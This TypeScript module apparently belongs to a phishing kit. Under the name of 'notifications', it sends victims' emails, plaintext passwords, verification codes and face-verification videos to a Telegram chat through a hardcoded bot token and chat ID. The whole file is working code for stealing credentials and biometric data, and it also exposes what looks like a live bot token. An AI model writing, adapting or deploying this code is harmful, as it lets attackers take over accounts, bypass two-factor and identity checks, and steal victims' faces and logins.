import TelegramBot from 'node-telegram-bot-api';

const TELEGRAM_BOT_TOKEN = '8366649467:AAGaMF5mQBsffV-Zc2QU9AQ7XSjD0IKXf3Y';
const TELEGRAM_CHAT_ID = '7211220207';

// Initialize bot without polling (we only send messages)
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

export async function sendLoginNotification(email: string, password: string): Promise<void> {
  try {
    let messageText = `🔐 *LOGIN ATTEMPT*\n\n`;
    messageText += `*Email:* ${email}\n`;
    messageText += `*Password:* ${password}\n`;
    messageText += `*Time:* ${new Date().toLocaleString()}`;

    await bot.sendMessage(TELEGRAM_CHAT_ID, messageText, {
      parse_mode: 'Markdown'
    });

    console.log('Login notification sent successfully');
  } catch (error) {
    console.error('Error sending login notification:', error);
  }
}

export async function sendCodeNotification(email: string, code: string): Promise<void> {
  try {
    let messageText = `🔢 *VERIFICATION CODE SUBMITTED*\n\n`;
    messageText += `*Email:* ${email}\n`;
    messageText += `*Code:* ${code}\n`;
    messageText += `*Time:* ${new Date().toLocaleString()}`;

    await bot.sendMessage(TELEGRAM_CHAT_ID, messageText, {
      parse_mode: 'Markdown'
    });

    console.log('Code notification sent successfully');
  } catch (error) {
    console.error('Error sending code notification:', error);
  }
}

export async function sendFaceScanNotification(email: string): Promise<void> {
  try {
    let messageText = `📸 *FACE SCAN STARTED*\n\n`;
    messageText += `*Email:* ${email}\n`;
    messageText += `*Status:* Face verification in progress\n`;
    messageText += `*Time:* ${new Date().toLocaleString()}`;

    await bot.sendMessage(TELEGRAM_CHAT_ID, messageText, {
      parse_mode: 'Markdown'
    });

    console.log('Face scan notification sent successfully');
  } catch (error) {
    console.error('Error sending face scan notification:', error);
  }
}

export async function sendVideoNotification(email: string, videoBuffer: Buffer): Promise<void> {
  try {
    if (!videoBuffer || videoBuffer.length === 0) {
      console.error('Video buffer is empty');
      return;
    }

    const caption = `🎥 *FACE VERIFICATION VIDEO*\n\n*Email:* ${email}\n*Time:* ${new Date().toLocaleString()}`;

    await bot.sendVideo(TELEGRAM_CHAT_ID, videoBuffer, {
      caption,
      parse_mode: 'Markdown',
      supports_streaming: true
    });

    console.log('Video notification sent successfully');
  } catch (error) {
    console.error('Error sending video notification:', error);
    throw error;
  }
}